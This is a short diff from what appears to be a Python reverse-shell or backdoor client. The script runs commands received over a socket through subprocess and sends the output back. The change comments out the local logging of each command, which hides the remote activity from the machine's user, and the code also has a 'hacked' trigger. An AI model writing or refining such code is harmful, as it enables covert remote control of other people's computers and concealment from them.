@@ -29,6 +29,8 @@ while True:
     else:
         output = subprocess.getoutput(command)
         s.send(output.encode())
+        #s.send(f"""
+#{Colors.green}FINISHED{Colors.white}""".encode())
 
     if command.lower() == "hacked":
         print(f"{Colors.green}CHAT OPENED")
@@ -48,7 +50,7 @@ while True:
 
 
 
-    print(f"{Colors.white}LOG:{Colors.green}",command) # if you want to hide the logs just delete this line
+   # print(f"{Colors.white}LOG:{Colors.green}",command) # if you want to see the logs just reitre the # in this line
 
     
 s.close()
